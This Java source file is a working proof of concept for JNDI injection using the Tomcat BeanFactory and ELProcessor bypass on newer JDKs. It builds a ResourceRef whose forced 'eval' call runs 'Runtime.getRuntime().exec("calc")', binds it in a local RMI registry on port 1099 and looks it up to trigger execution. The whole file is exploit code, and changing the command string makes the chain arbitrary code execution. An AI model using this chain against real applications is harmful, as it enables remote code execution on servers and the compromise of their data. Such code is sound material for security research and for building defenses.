package run.ergou.jndi.high;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class LoadLocal {
    public static void main(String[] args) throws Exception {
        // Reference子类，存在可控属性，指定本地工厂org.apache.naming.factory.BeanFactory
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);

        LocateRegistry.createRegistry(1099);
        Naming.bind("bypass", referenceWrapper);

        new InitialContext().lookup("rmi://127.0.0.1:1099/bypass");
    }
}
